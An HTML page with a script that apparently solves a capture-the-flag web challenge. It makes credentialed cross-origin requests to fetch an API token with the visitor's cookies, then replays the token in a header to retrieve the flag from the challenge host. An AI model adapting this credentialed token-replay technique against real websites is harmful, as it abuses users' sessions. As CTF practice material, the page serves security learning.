<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>PO CTF - token -> flag</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:2rem}
    button{margin:0.25rem;padding:.5rem 1rem}
    pre{background:#f6f6f6;padding:1rem;white-space:pre-wrap}
  </style>
</head>
<body>
  <h1>PO CTF â€” fetch token & flag</h1>

  <button id="getToken">Fetch /api/token</button>
  <button id="getFlag" disabled>POST /api/flag with X-Flag-Token</button>

  <p id="status">Idle</p>
  <pre id="out"></pre>

<script>
const out = document.getElementById('out');
const status = document.getElementById('status');
const btnToken = document.getElementById('getToken');
const btnFlag = document.getElementById('getFlag');

let apiToken = null;
const log = (s) => { out.textContent += s + "\n"; console.log(s); };
const setStatus = (s) => { status.textContent = s; };

btnToken.onclick = async () => {
  btnToken.disabled = true;
  setStatus("Fetching /api/token...");
  try {
    const r = await fetch("https://web200-1.pointeroverflowctf.com/api/token", {
      method: "GET",
      credentials: "include"
    });
    if (!r.ok) {
      const t = await r.text().catch(()=>null);
      setStatus("Token request failed: " + r.status);
      log("Token response (non-OK): " + t);
      btnToken.disabled = false;
      return;
    }
    const json = await r.json();
    apiToken = json.apiToken;
    setStatus("Token fetched. Ready to call /api/flag.");
    log("apiToken: " + apiToken);
    btnFlag.disabled = false;
  } catch(err) {
    setStatus("Error fetching token");
    log(String(err));
    btnToken.disabled = false;
  }
};

btnFlag.onclick = async () => {
  if (!apiToken) {
    setStatus("No token available");
    return;
  }
  btnFlag.disabled = true;
  setStatus("Calling /api/flag with X-Flag-Token...");
  try {
    const r = await fetch("https://web200-1.pointeroverflowctf.com/api/flag", {
      method: "POST", // you provided POST in your snippet
      credentials: "include",
      headers: {
        "X-Flag-Token": apiToken,
        "Accept": "application/json"
      }
    });

    // Try to parse JSON, fallback to text
    let body;
    const ct = r.headers.get('content-type') || '';
    if (ct.includes('application/json')) {
      body = await r.json();
      log("Response (json): " + JSON.stringify(body));
    } else {
      body = await r.text();
      log("Response (text): " + body);
    }

    setStatus("Flag request finished: " + r.status);
  } catch (err) {
    setStatus("Error fetching flag");
    log(String(err));
  } finally {
    btnFlag.disabled = false;
  }
};
</script>
</body>
</html>
